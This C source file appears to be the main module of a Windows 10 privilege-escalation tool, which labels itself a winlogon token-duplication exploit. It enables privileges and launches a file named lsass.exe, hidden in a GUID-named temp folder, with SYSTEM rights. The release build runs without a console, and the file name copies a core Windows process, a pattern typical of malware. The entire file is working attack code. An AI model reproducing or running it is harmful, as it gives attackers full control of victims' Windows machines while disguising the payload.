#include <Windows.h>
#include <stdio.h>
#include "GetSystemPriv.h"
#include "DebugFunc.h"




LPWSTR GetLsassPath() {
	LPWSTR programToRun = (LPWSTR)calloc(MAX_PATH, 2);
	if (programToRun == NULL)
		return NULL;

	if (GetTempPathW(MAX_PATH, programToRun) > 0) {
		wcscat_s(programToRun, MAX_PATH, L"23E8BC3FE-A258-CF1F-FDD0-F5B3ECFC7A6\\lsass.exe");
	}else {
		PrintDebug("[X] GetTempPathW Failed !\n");
		return NULL;
	}
		
	PrintDebug("Path: %ws\n", programToRun);
	return programToRun;
}

#if _DEBUG
int main() {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
#endif
	PrintDebug("[-] WINDOWS 10 - System exploit (Winlogin token Duplication)\n");

	LPWSTR programToRun = GetLsassPath();
	if (programToRun == NULL) {
		PauseDebug();
		return TRUE;
	}
		

	if (!SetWindowsPrivilege()) {
		PrintDebug("[X] SetWindowsPrivilege Failed !\n");
		free(programToRun);
		PauseDebug();
		return TRUE;
	}
	if (!GetSystemPriv(programToRun)) {
		PrintDebug("[X] GetSystemPriv Failed !\n");
		free(programToRun);
		PauseDebug();
		return TRUE;
	}
	free(programToRun);
	PauseDebug();
	return FALSE;
}